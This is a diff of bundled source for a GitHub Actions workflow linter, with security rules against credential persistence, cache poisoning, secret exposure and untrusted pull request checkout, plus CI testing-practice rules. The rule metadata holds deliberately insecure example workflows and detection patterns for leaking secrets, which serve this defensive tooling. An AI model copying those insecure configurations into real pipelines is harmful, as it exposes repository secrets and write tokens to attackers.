+  const index = job.steps.findIndex((step) => usesAction(step, "actions/checkout") && untrustedCheckoutTarget(step));
+  if (index < 0) return void 0;
+  const runsCode = job.steps.slice(index + 1).some((step) => step.run !== void 0 || step.uses?.action.kind === "local");
+  return runsCode ? "the job runs pull request code in a privileged workflow" : void 0;
+}
+function addPersistCredentials(file, workflow, step) {
+  const description = "Set persist-credentials: false";
+  if (step.with.size > 0 || step.uses?.kind !== "literal") {
+    const withNode = directWith(workflow, step);
+    const pairs = (withNode?.items ?? []).filter((pair) => (0, import_yaml14.isScalar)(pair.key) && pair.key.value !== "<<");
+    const first = pairs[0];
+    const last = pairs[pairs.length - 1];
+    if (!first || !last) return void 0;
+    const firstLine = lineOfNode(workflow.source, first.key);
+    const indent2 = indentOf(file.content, firstLine);
+    const lastLine = lineOfNode(workflow.source, last.key);
+    const value2 = last.value;
+    const endsOnKeyLine = (0, import_yaml14.isScalar)(value2) && SINGLE_LINE.has(value2.type) && value2.range !== void 0 && value2.range !== null && workflow.source.lineCounter.linePos(Math.max(value2.range[0], value2.range[1] - 1)).line === lastLine;
+    const line = `${indent2}persist-credentials: false`;
+    return fix(description, insertLinesAfter(file, endsOnKeyLine ? lastLine : firstLine - 1, [line]));
+  }
+  const node = directStep(workflow, step);
+  if (!node || node.items.some((pair) => (0, import_yaml14.isScalar)(pair.key) && pair.key.value === "with")) return void 0;
+  const usesPair = node.items.find((pair) => (0, import_yaml14.isScalar)(pair.key) && pair.key.value === "uses");
+  if (!usesPair || !(0, import_yaml14.isScalar)(usesPair.value) || !SINGLE_LINE.has(usesPair.value.type)) return void 0;
+  const usesLine = lineOfNode(workflow.source, usesPair.key);
+  const text4 = lineText(file.content, usesLine);
+  const match2 = /^(\s*)(-\s+)?uses\s*:/.exec(text4);
+  if (!match2) return void 0;
+  const indent = (match2[1] ?? "") + " ".repeat(match2[2]?.length ?? 0);
+  return fix(description, insertLinesAfter(file, usesLine, [`${indent}with:`, `${indent}  persist-credentials: false`]));
+}
+var persisted_credentials_default = defineRule({
+  meta: {
+    id: "security/persisted-credentials",
+    ruleset: "security",
+    description: "`actions/checkout` should set `persist-credentials: false` in jobs that upload the workspace or run pull request code with elevated privileges.",
+    rationale: "By default `actions/checkout` writes the job's token into `.git/config` so later git commands can authenticate. Any later step can read it, and an artifact that includes the `.git` directory publishes it to anyone who can download the artifact. When the job does not push, disabling credential persistence removes the token from disk entirely.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://github.com/actions/checkout#usage",
+      "https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions",
+      "https://github.com/actions/upload-artifact#uploading-hidden-files"
+    ],
+    impact: "medium",
+    fixable: true,
+    example: {
+      bad: "- uses: actions/checkout@v5\n- uses: actions/upload-artifact@v4\n  with:\n    path: .\n    include-hidden-files: true",
+      good: "- uses: actions/checkout@v5\n  with:\n    persist-credentials: false\n- uses: actions/upload-artifact@v4\n  with:\n    path: .\n    include-hidden-files: true"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      const file = project.files.get(workflow.path);
+      for (const job of workflow.jobs) {
+        const checkouts = job.steps.filter(
+          (step) => usesAction(step, "actions/checkout") && !isFalse(step.with.get("persist-credentials")?.value)
+        );
+        if (checkouts.length === 0) continue;
+        const reason = exposure(workflow, job, file);
+        if (reason === void 0) continue;
+        for (const step of checkouts) {
+          if (step.with.get("persist-credentials")?.kind === "expression") continue;
+          const repair = file ? addPersistCredentials(file, workflow, step) : void 0;
+          report({
+            path: workflow.path,
+            line: stepLine(step),
+            key: `${step.key}.with.persist-credentials`,
+            message: `Checkout leaves the job token in \`.git/config\` and ${reason}.`,
+            suggestion: "Add `persist-credentials: false` under `with:`. If a later step must push, pass the token to that step explicitly instead.",
+            ...repair ? { fix: repair } : {}
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/privileged-cache-restore.ts
+var CACHE_ACTIONS = /* @__PURE__ */ new Set([...CACHE_RESTORE_ACTIONS, "actions/cache/save"]);
+function cacheUse(step) {
+  const action = step.uses?.action;
+  if (action?.kind !== "remote" || action.name === void 0) return void 0;
+  if (CACHE_ACTIONS.has(action.name)) return action.name;
+  if (/^actions\/setup-[a-z0-9-]+$/.test(action.name)) {
+    const cache = step.with.get("cache");
+    if (cache === void 0) return void 0;
+    const value2 = cache.value;
+    if (value2 === void 0 || value2 === null || value2 === "" || isFalse(value2)) return void 0;
+    return `${action.name} (cache: ${String(value2)})`;
+  }
+  return void 0;
+}
+var privileged_cache_restore_default = defineRule({
+  meta: {
+    id: "security/privileged-cache-restore",
+    ruleset: "security",
+    description: "Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment` should not restore or save dependency caches.",
+    rationale: "The Actions cache is shared across workflows on the same branch scope. A cache entry written by untrusted code (for example a pull request build on the default branch's scope, or a privileged job that ran contributor code) can be restored into a privileged job, which then executes the poisoned binaries with secrets and a write token. Privileged workflows should build from clean inputs.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#restrictions-for-accessing-a-cache",
+      "https://docs.github.com/en/actions/reference/security/secure-use",
+      "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
+    ],
+    impact: "medium",
+    example: {
+      bad: "on: pull_request_target\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-node@v5\n        with:\n          cache: npm",
+      good: "on: pull_request_target\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-node@v5"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (!isPrivileged(workflow)) continue;
+      const triggers = privilegedTriggers(workflow).join(", ");
+      for (const job of workflow.jobs) {
+        for (const step of job.steps) {
+          const use = cacheUse(step);
+          if (use === void 0) continue;
+          report({
+            path: workflow.path,
+            line: stepLine(step),
+            key: `${step.key}.uses`,
+            message: `${use} uses the Actions cache in a workflow triggered by ${triggers}, where a poisoned cache entry would run with elevated privileges.`,
+            suggestion: "Drop caching from privileged workflows (remove the cache step or the `cache:` input). Keep caching in unprivileged `pull_request`/`push` workflows."
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/secrets-bulk-expose.ts
+var TO_JSON_SECRETS = /toJSON\s*\(\s*secrets\s*\)/i;
+var SECRET_EXPRESSION = /\$\{\{\s*secrets\.[A-Za-z_][A-Za-z0-9_]*\s*\}\}/i;
+var PRINT = /^(?:echo|printf)\b/;
+function secretEnvNames(workflow, job, step) {
+  const names = [];
+  for (const env of [workflow.env, job.env, step.env]) {
+    for (const [name, value2] of Object.entries(env)) {
+      if (typeof value2 === "string" && /^[A-Za-z_][A-Za-z0-9_]*$/.test(name) && /\$\{\{\s*secrets\.[A-Za-z_]/i.test(normalizeAccess(value2))) {
+        names.push(name);
+      }
+    }
+  }
+  return names;
+}
+var SAFE_CONSUMER = /--password-stdin\b|--with-token\b|^\s*(?:gpg\b.*--import|ssh-add\b|docker\s+secret\s+create\b)/;
+var LEAKY_FILTER = /^\s*(?:base64|base32|basenc|xxd|od|hexdump|rev|tee|cat|tr|sed|awk|cut|fold|jq|openssl)\b/;
+var REDIRECT = /(?:^|[^<\d&])\d?>>?\s*(&\d|"[^"]*"|'[^']*'|\S+)/;
+var LOGGED_TARGET = /^(?:&[12]|\/dev\/std(?:out|err))$|GITHUB_STEP_SUMMARY/;
+function reachesLog(command) {
+  const stages = command.split(/(?<!\|)\|(?!\|)/);
+  const last = stages[stages.length - 1] ?? "";
+  const redirect = REDIRECT.exec(last)?.[1];
+  if (redirect !== void 0) return LOGGED_TARGET.test(redirect.replace(/^["']|["']$/g, ""));
+  if (stages.length === 1) return true;
+  if (SAFE_CONSUMER.test(last)) return false;
+  return LEAKY_FILTER.test(last);
+}
+function printsSecret(command, envNames2) {
+  if (!PRINT.test(command) || command.includes("::add-mask::") || !reachesLog(command)) return void 0;
+  const direct2 = SECRET_EXPRESSION.exec(normalizeAccess(command))?.[0];
+  if (direct2 !== void 0) return direct2;
+  return envNames2.find((name) => new RegExp(String.raw`\$(?:\{${name}\}|${name}\b)`).test(command));
+}
+var secrets_bulk_expose_default = defineRule({
+  meta: {
+    id: "security/secrets-bulk-expose",
+    ruleset: "security",
+    description: "Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` or print secrets with `echo`/`printf`.",
+    rationale: "`toJSON(secrets)` hands every repository and organization secret to a single step, so one compromised action or script leaks all of them; it also defeats per-job least privilege. Printing a secret relies entirely on log masking, which misses transformed values (base64, substrings, JSON escapes) and leaves the value in step summaries or downstream tools. Pass only the specific secrets a step needs through `env:` and never write them to stdout.",
+    kind: "practice",
+    defaultSeverity: "error",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/security/secure-use#use-secrets-for-sensitive-information",
+      "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions"
+    ],
+    impact: "high",
+    example: {
+      bad: "- env:\n    ALL_SECRETS: ${{ toJSON(secrets) }}\n  run: ./deploy.sh",
+      good: "- env:\n    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n  run: ./deploy.sh"
+    }
+  },
+  check({ project, report }) {
+    const models = [...project.workflows, ...project.actions];
+    for (const workflow of models) {
+      const file = project.files.get(workflow.path);
+      if (!file) continue;
+      const lineCount = file.content.split("\n").length;
+      for (let line = 1; line <= lineCount; line++) {
+        const text4 = lineText(file.content, line);
+        if (/^\s*#/.test(text4) || !TO_JSON_SECRETS.test(text4)) continue;
+        report({
+          path: workflow.path,
+          line,
+          message: "`toJSON(secrets)` exposes every secret available to the workflow at once.",
+          suggestion: "Pass only the individual secrets this step needs, e.g. `TOKEN: ${{ secrets.TOKEN }}`."
+        });
+      }
+    }
+    for (const { workflow, job, step } of steps(models)) {
+      const envNames2 = secretEnvNames(workflow, job, step);
+      for (const { command, line } of commandsOf(step)) {
+        const leaked = printsSecret(command.trim(), envNames2);
+        if (leaked === void 0) continue;
+        report({
+          path: workflow.path,
+          line,
+          key: `${step.key}.run`,
+          message: `\`${command.trim().split(/\s+/)[0] ?? "echo"}\` prints a secret (${leaked}) to the job log, relying on masking to hide it.`,
+          suggestion: "Don't print secrets. Pass the value to the tool that needs it via `env:` or a file with restricted permissions."
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/untrusted-checkout.ts
+var PR_CHECKOUT = /\bgh\s+pr\s+checkout\b/;
+var untrusted_checkout_default = defineRule({
+  meta: {
+    id: "security/untrusted-checkout",
+    ruleset: "security",
+    description: "`pull_request_target` and `workflow_run` workflows must not check out the pull request's code and then execute it.",
+    rationale: "These triggers run in the base repository's context with its secrets and a token that can write. Checking out the contributor's head commit and then running a build, test, script, or local action executes attacker-authored code with those privileges (a \"pwn request\"). Run untrusted code in a `pull_request` workflow instead, and hand results to the privileged workflow as data.",
+    kind: "practice",
+    defaultSeverity: "error",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request_target",
+      "https://docs.github.com/en/actions/reference/security/secure-use",
+      "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
+    ],
+    impact: "high",
+    example: {
+      bad: "on: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test",
+      good: "on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@v5\n      - run: npm ci && npm test"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (!hasTrigger(workflow, "pull_request_target", "workflow_run")) continue;
+      for (const job of workflow.jobs) {
+        for (const [index, step] of job.steps.entries()) {
+          let target;
+          let line = stepLine(step);
+          if (usesAction(step, "actions/checkout")) {
+            target = untrustedCheckoutTarget(step);
+          } else {
+            const command = commandsOf(step).find((entry2) => PR_CHECKOUT.test(entry2.command));
+            if (command) {
+              target = "gh pr checkout";
+              line = command.line;
+            }
+          }
+          if (target === void 0) continue;
+          let executes;
+          let what = "";
+          for (const later of job.steps.slice(index + 1)) {
+            if (later.run !== void 0) what = "a `run` step";
+            else if (later.uses?.action.kind === "local") what = `the local action \`${later.uses.value}\``;
+            else what = executesWorkspace(later) ?? "";
+            if (what) {
+              executes = later;
+              break;
+            }
+          }
+          if (!executes) continue;
+          report({
+            path: workflow.path,
+            line,
+            key: step.key,
+            message: `Privileged workflow checks out untrusted pull request code (${target}) and then executes ${what} at line ${stepLine(executes)}.`,
+            suggestion: "Move build and test steps to a `pull_request` workflow. If this job must stay privileged, check out the base ref only, or keep the PR checkout in a separate path and treat it strictly as data.",
+            related: [{ path: workflow.path, line: stepLine(executes) }]
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/index.ts
+var rules9 = [
+  env_file_injection_default,
+  excessive_permissions_default,
+  expression_injection_default,
+  install_scripts_privileged_default,
+  mutable_remote_ref_default,
+  persisted_credentials_default,
+  privileged_cache_restore_default,
+  secrets_bulk_expose_default,
+  untrusted_checkout_default
+];
+
+// src/lint/rules/testing/shared.ts
+function stripRunner(words2) {
+  let rest = words2;
+  for (let guard = 0; guard < 3; guard += 1) {
+    const [first = "", second] = rest;
+    if (first === "npx" || first === "bunx" || first === "pnpx") {
+      rest = rest.slice(1);
+      while (rest[0]?.startsWith("-")) rest = rest.slice(1);
+    } else if ((first === "pnpm" || first === "yarn" || first === "bun") && (second === "exec" || second === "dlx" || second === "x")) {
+      rest = rest.slice(2);
+    } else if (first === "npm" && (second === "exec" || second === "x")) {
+      rest = rest.slice(2);
+      while (rest[0]?.startsWith("-")) rest = rest.slice(1);
+    } else if (/^python[\d.]*$/.test(first) && second === "-m") {
+      rest = rest.slice(2);
+    } else {
+      break;
+    }
+  }
+  return rest;
+}
+function toolWords(command) {
+  const words2 = stripRunner(commandWords(command.replace(/["']/g, "")));
+  const [first, ...rest] = words2;
+  return first === void 0 ? [] : [basename(first), ...rest];
+}
+function toolInvocation(command, names) {
+  const words2 = toolWords(command);
+  const [first = "", second = ""] = words2;
+  if (names.has(first)) return words2;
+  if ((first === "yarn" || first === "pnpm" || first === "bun") && names.has(second)) return words2.slice(1);
+  return void 0;
+}
+var TEST_RUNNERS = /* @__PURE__ */ new Set(["jest", "vitest", "pytest", "py.test", "mocha", "ava", "karma", "tox", "nox", "phpunit", "rspec"]);
+var TEST_SCRIPT = /^(?:test|tests|e2e|unit|integration)(?:[:-][\w:.-]+)?$/i;
+function testCommand(command) {
+  const words2 = toolWords(command);
+  const [first = "", second = "", ...rest] = words2;
+  const args = [second, ...rest].filter(Boolean);
+  if (args.some((word) => word === "--version" || word === "--help" || word === "-h")) return void 0;
+  if (TEST_RUNNERS.has(first)) {
+    if (first === "vitest" && ["bench", "init", "list"].includes(second)) return void 0;
+    if (first === "karma" && second !== "start" && second !== "run") return void 0;
+    return first;
+  }
+  if (first === "playwright" && second === "test") return "playwright test";
+  if (first === "cypress" && second === "run") return "cypress run";
+  if (first === "go" && second === "test") return "go test";
+  if (first === "cargo" && (second === "test" || second === "nextest")) return `cargo ${second}`;
+  if (first === "dotnet" && second === "test") return "dotnet test";
+  if (["mvn", "mvnw", "mvnw.cmd"].includes(first) && args.some((word) => word === "test" || word === "verify")) return "mvn test";
+  if (["gradle", "gradlew", "gradlew.bat"].includes(first) && args.some((word) => /^(?::[\w-]+)*:?(?:test|check|\w+Test)$/.test(word))) {
+    return "gradle test";
+  }
+  if (["npm", "yarn", "pnpm", "bun"].includes(first)) {
+    const positional = args.filter((word) => !word.startsWith("-"));
+    const run4 = positional[0] === "run" || positional[0] === "run-script";
+    const script = run4 ? positional[1] : positional[0];
+    if (script !== void 0 && (TEST_SCRIPT.test(script) || script === "t" && first === "npm")) {
+      return `${first} ${run4 ? "run " : ""}${script}`;
+    }
+  }
+  return void 0;
+}
+function outcomeInspected(steps2, step) {
+  if (step.id === void 0) return false;
+  const id = step.id.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const pattern = new RegExp(`steps\\.${id}\\.(?:outcome|conclusion)|steps\\[['"]${id}['"]\\]\\.(?:outcome|conclusion)`);
+  return steps2.some((other) => {
+    if (other === step) return false;
+    const texts = [other.if, other.run?.value, JSON.stringify(other.env), JSON.stringify([...other.with.values()].map((entry2) => entry2.value))];
+    return texts.some((text4) => text4 !== void 0 && pattern.test(text4));
+  });
+}
+function stepNode2(source, step) {
+  const match2 = /^(?:jobs\.(.+)\.steps|runs\.steps)\[(\d+)\]$/.exec(step.key);
+  if (!match2) return void 0;
+  const root = source.doc.contents;
+  const parent = match2[1] !== void 0 ? field(source, field(source, root, "jobs")?.value, match2[1])?.value : field(source, root, "runs")?.value;
+  return items(source, field(source, parent, "steps")?.value)[Number(match2[2])];
+}
+function jobNode3(source, job) {
+  return field(source, field(source, source.doc.contents, "jobs")?.value, job.id)?.value;
+}
+function continueOnErrorTrue(source, node) {
+  const entry2 = field(source, node, "continue-on-error");
+  const value2 = entry2 ? toJS(source, entry2.value) : void 0;
+  return value2 === true || typeof value2 === "string" && value2.trim().toLowerCase() === "true" ? entry2 : void 0;
+}
+function sourceFor(project, path) {
+  return project.workflows.find((workflow) => workflow.path === path) ?? project.actions.find((action) => action.path === path);
+}
+function workingDirectory2(workflow, job, step) {
+  const dir = step.workingDirectory ?? job.workingDirectory ?? workflow.workingDirectory ?? "";
+  if (dir.includes("$") || dir.startsWith("/") || dir.startsWith("~")) return void 0;
+  return dir.replace(/^\.(?:\/|$)/, "").replace(/\/+$/, "");
+}
+function packageScript(project, dir, name) {
+  const scripts = project.manifests.find((manifest) => manifest.dir === dir)?.json.scripts;
+  if (!scripts || typeof scripts !== "object") return void 0;
+  const value2 = scripts[name];
+  return typeof value2 === "string" ? value2 : void 0;
+}
+function scriptLines2(script) {
+  const result = [];
+  let offset = 0;
+  let buffer = "";
+  let start2 = 0;
+  for (const raw of script.split("\n")) {
+    const lineOffset = offset;
+    offset += raw.length + 1;
+    const text4 = raw.replace(/\r$/, "");
+    if (buffer === "") start2 = lineOffset;
+    if (/\\\s*$/.test(text4)) {
+      buffer += text4.replace(/\\\s*$/, " ");
+      continue;
+    }
+    buffer += text4;
+    const trimmed = buffer.trim();
+    if (trimmed !== "" && !trimmed.startsWith("#")) result.push({ text: buffer, offset: start2 });
+    buffer = "";
+  }
+  return result;
+}
+
+// src/lint/rules/testing/cache-disabled-install.ts
+var TEMP_CACHE = /^(?:\/tmp|\/var\/tmp|\$RUNNER_TEMP|\$\{RUNNER_TEMP\}|\$\{\{\s*runner\.temp\s*\}\}|%TEMP%|\$env:TEMP|\$TMPDIR|\.npm-tmp)/i;
+function cacheDefeat(command) {
+  const words2 = toolWords(command);
+  const [tool2, sub, third] = words2;
+  if (tool2 === "npm" && sub === "cache" && third === "clean") return { ecosystem: "npm", what: "`npm cache clean` empties" };
+  if (tool2 === "yarn" && sub === "cache" && third === "clean") return { ecosystem: "yarn", what: "`yarn cache clean` empties" };
+  if (tool2 === "pnpm" && sub === "store" && third === "prune") return { ecosystem: "pnpm", what: "`pnpm store prune` shrinks" };
+  if (tool2 === "npm" && (sub === "ci" || sub === "install" || sub === "i")) {
+    for (let i = 2; i < words2.length; i++) {
+      const word = words2[i] ?? "";
+      const value2 = word.startsWith("--cache=") ? word.slice("--cache=".length) : word === "--cache" ? words2[i + 1] : void 0;
+      if (value2 !== void 0 && TEMP_CACHE.test(value2)) return { ecosystem: "npm", what: `\`npm ${sub} --cache ${value2}\` bypasses` };
+    }
+  }
+  const pip = tool2 === "pip" || tool2 === "pip3" || tool2 === "uv" && sub === "pip";
+  const pipArgs = tool2 === "uv" ? words2.slice(2) : words2.slice(1);
+  if (pip && pipArgs[0] === "install" && pipArgs.includes("--no-cache-dir")) {
+    return { ecosystem: "pip", what: "`pip install --no-cache-dir` bypasses" };
+  }
+  if ((tool2 === "pip" || tool2 === "pip3") && sub === "cache" && (third === "purge" || third === "remove")) {
+    return { ecosystem: "pip", what: `\`pip cache ${third}\` empties` };
+  }
+  return void 0;
+}
+function setupCache(steps2, action, values2) {
+  return steps2.some((step) => {
+    if (!usesAction(step, action)) return false;
+    const cache = step.with.get("cache");
+    return cache !== void 0 && (cache.kind !== "literal" || values2.test(String(cache.value)));
+  });
+}
+function restoresCache(steps2, ecosystem) {
+  if (ecosystem === "pip") return setupCache(steps2, "actions/setup-python", /pip/i) || cacheCovers(steps2, /pip/i, /pip/i);
+  return setupCache(steps2, "actions/setup-node", new RegExp(ecosystem, "i")) || cacheCovers(steps2, new RegExp(ecosystem === "pnpm" ? "pnpm" : ecosystem === "yarn" ? "yarn" : "\\.npm|npm", "i"), new RegExp(ecosystem, "i"));
+}
+var cache_disabled_install_default = defineRule({
+  meta: {
+    id: "testing/cache-disabled-install",
+    ruleset: "testing",
+    description: "Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps.",
+    rationale: "Restoring a dependency cache costs a download and a save on every run; clearing it, pointing installs at an empty temporary cache or passing `--no-cache-dir` throws that work away and makes every install download from the registry again.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://github.com/actions/setup-node#caching-global-packages-data",
+      "https://github.com/actions/setup-python#caching-packages-dependencies",
+      "https://docs.npmjs.com/cli/commands/npm-cache"
+    ],
+    impact: "low",
+    example: {
+      bad: "- uses: actions/setup-node@v4\n  with:\n    cache: npm\n- run: npm cache clean --force && npm ci",
+      good: "- uses: actions/setup-node@v4\n  with:\n    cache: npm\n- run: npm ci"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      for (const job of workflow.jobs) {
+        const commands = jobCommands(project, workflow, job);
+        if (commands.length === 0) continue;
+        const all = project.expandedSteps(job);
+        for (const entry2 of commands) {
+          const defeat = cacheDefeat(entry2.command);
+          if (!defeat || !restoresCache(all, defeat.ecosystem)) continue;
+          report({
+            path: workflow.path,
+            line: entry2.direct ? entry2.line : stepLine(entry2.owner),
+            key: `${entry2.step.key}:${defeat.ecosystem}:${entry2.command}`,
+            message: `${defeat.what} the ${defeat.ecosystem} cache that job \`${job.id}\` restores, so the restore is wasted and dependencies download again.`,
+            suggestion: "Drop the cache-clearing command or flag and let the install use the restored cache."
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/testing/fixed-sleep.ts
+var BACKGROUND = /(?:^|[^&])&\s*(?:$|[;#)])|\bnohup\b|\bdocker\s+(?:container\s+)?run\b[^\n]*\s(?:-d|--detach|-\w*d\w*)\b|\bdocker[\s-]compose\s+(?:[^\n]*\s)?up\b[^\n]*\s(?:-d|--detach)\b|\bStart-Process\b|\bstart\s+\/b\b|\bsystemctl\s+start\b|\bservice\s+\S+\s+start\b/i;
+var LOOP = /(?:^|[\s;&|(])(?:for|while|until|foreach|do)\b|\bForEach-Object\b|%\s*\{/i;
+var UNIT = { "": 1, s: 1, m: 60, h: 3600 };
+function seconds(value2, scale = 1) {
+  const match2 = /^(\d+(?:\.\d+)?)([smh]?)$/i.exec(value2 ?? "");
+  if (!match2) return void 0;
+  return Number(match2[1]) * (UNIT[(match2[2] ?? "").toLowerCase()] ?? 1) / scale;
+}
+function fixedWait(command) {
+  const words2 = command.trim().split(/\s+/).map((word) => word.replace(/^["']|["']$/g, ""));
+  const tool2 = (words2[0] ?? "").toLowerCase();
+  if (tool2 === "sleep" && words2.length === 2) {
+    const value2 = seconds(words2[1]);
+    return value2 === void 0 ? void 0 : { seconds: value2, text: `sleep ${words2[1]}` };
+  }
+  if (tool2 === "start-sleep") {
+    let value2;
+    for (let i = 1; i < words2.length; i++) {
+      const word = (words2[i] ?? "").toLowerCase();
+      if (/^-s(?:e(?:c(?:o(?:n(?:d(?:s)?)?)?)?)?)?$/.test(word)) value2 = seconds(words2[i + 1]);
+      else if (/^-m(?:i(?:l(?:l(?:i(?:s(?:e(?:c(?:o(?:n(?:d(?:s)?)?)?)?)?)?)?)?)?)?)?$/.test(word)) value2 = seconds(words2[i + 1], 1e3);
+      else if (i === 1 && /^\d/.test(word)) value2 = seconds(word);
+      else continue;
+      break;
+    }
+    return value2 === void 0 ? void 0 : { seconds: value2, text: words2.join(" ") };
+  }
+  if (tool2 === "timeout" || tool2 === "timeout.exe") {
+    const index = words2.findIndex((word) => word.toLowerCase() === "/t");
+    const value2 = index > 0 ? seconds(words2[index + 1]) : void 0;
+    return value2 === void 0 ? void 0 : { seconds: value2, text: words2.join(" ") };
+  }
+  return void 0;
+}
+var fixed_sleep_default = defineRule({
+  meta: {
+    id: "testing/fixed-sleep",
+    ruleset: "testing",
+    description: "Run steps should wait for services to become ready instead of sleeping for a fixed time.",
+    rationale: "A fixed `sleep` before tests is a guess: on a fast runner it wastes the whole interval on every run, and on a slow or busy runner it is too short and the tests fail intermittently. Polling for readiness returns as soon as the service is up and fails clearly when it never comes up.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: { minSeconds: 5 },
+    validateOptions: (options) => typeof options.minSeconds === "number" && options.minSeconds > 0 ? [] : ["minSeconds must be a positive number"],
+    references: [
+      "https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers",
+      "https://docs.docker.com/reference/cli/docker/compose/up/",
+      "https://www.npmjs.com/package/wait-on"
+    ],
+    impact: "medium",
+    example: {
+      bad: "- run: docker compose up -d && sleep 30\n- run: npm run test:e2e",
+      good: "- run: docker compose up -d --wait\n- run: npm run test:e2e"
+    }
+  },
+  check({ project, options, report }) {
+    for (const workflow of project.workflows) {
+      for (const job of workflow.jobs) {
+        const commands = jobCommands(project, workflow, job);
+        let started = job.services.length > 0;
+        for (const entry2 of commands) {
+          const parts2 = entry2.command.split(/(?<![&>|])&(?![&>])/).map((part2) => part2.trim());
+          const last = parts2.pop() ?? "";
+          if (parts2.some((part2) => part2 !== "")) started = true;
+          const wait = fixedWait(last);
+          if (!wait) {
+            if (BACKGROUND.test(last)) started = true;
+            continue;
+          }
+          if (!started || wait.seconds < options.minSeconds) continue;
+          if (LOOP.test(entry2.step.run?.value ?? "")) continue;
+          report({
+            path: workflow.path,
+            line: entry2.direct ? entry2.line : stepLine(entry2.owner),
+            key: `${entry2.step.key}:${entry2.command}`,
+            message: `\`${wait.text}\` waits a fixed ${wait.seconds} seconds instead of checking that what it waits for is ready.`,
+            suggestion: "Poll for readiness instead: `docker compose up --wait`, service-container health checks (`--health-cmd`), `npx wait-on <url>`, or a bounded `until curl -fsS <url>; do sleep 1; done` loop."
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/testing/masked-failures.ts
+var SWALLOW = /\|\|\s*(?:true|:|exit\s+0)\s*(?=$|[;&)#])/;
+function swallowedTest(line) {
+  const match2 = SWALLOW.exec(line);
+  if (!match2) return void 0;
+  const before = line.slice(0, match2.index).split(/&&|\|\||;|\|/);
+  return testCommand((before[before.length - 1] ?? "").trim());
+}
+var masked_failures_default = defineRule({
+  meta: {
+    id: "testing/masked-failures",
+    ruleset: "testing",
+    description: "Test failures should fail the job, not be silenced by `continue-on-error: true` or `|| true`.",
+    rationale: "When a failing test step is allowed to pass, the check stays green, regressions merge unnoticed and the minutes spent running the tests buy no signal. Agents that iterate until CI is green are especially misled by a check that cannot fail.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepscontinue-on-error",
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idcontinue-on-error"
+    ],
+    impact: "high",
+    example: {
+      bad: "- run: npm test\n  continue-on-error: true",
+      good: "- run: npm test"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      for (const job of workflow.jobs) {
+        const expanded = expandedJobSteps(project, workflow, job);
+        const all = expanded.map((entry2) => entry2.step);
+        const jobField = continueOnErrorTrue(workflow.source, jobNode3(workflow.source, job));
+        if (jobField) {
+          const test = jobCommands(project, workflow, job).map((entry2) => testCommand(entry2.command)).find(Boolean);
+          if (test) {
+            report({
+              path: workflow.path,
+              line: jobField.line,
+              key: `${job.key}:continue-on-error`,
+              message: `Job \`${job.id}\` runs \`${test}\` with \`continue-on-error: true\`, so test failures never fail the workflow.`,
+              suggestion: "Remove `continue-on-error`, or limit it to known-unstable matrix entries with an expression such as `${{ matrix.experimental }}`."
+            });
+          }
+        }
+        for (const { step, owner, path, direct: direct2 } of expanded) {
+          const commands = commandsOf(step);
+          const test = commands.map((entry2) => testCommand(entry2.command)).find(Boolean);
+          if (!test) continue;
+          const source = sourceFor(project, path);
+          const stepField = source ? continueOnErrorTrue(source.source, stepNode2(source.source, step)) : void 0;
+          if (stepField && !outcomeInspected(all, step)) {
+            report({
+              path: workflow.path,
+              line: direct2 ? stepField.line : stepLine(owner),
+              key: `${step.key}:continue-on-error`,
+              message: `\`${test}\` runs with \`continue-on-error: true\`, so failing tests leave the job green.`,
+              suggestion: "Remove `continue-on-error`. To collect results before failing, give the step an `id` and fail a later step on `steps.<id>.outcome == 'failure'`."
+            });
+          }
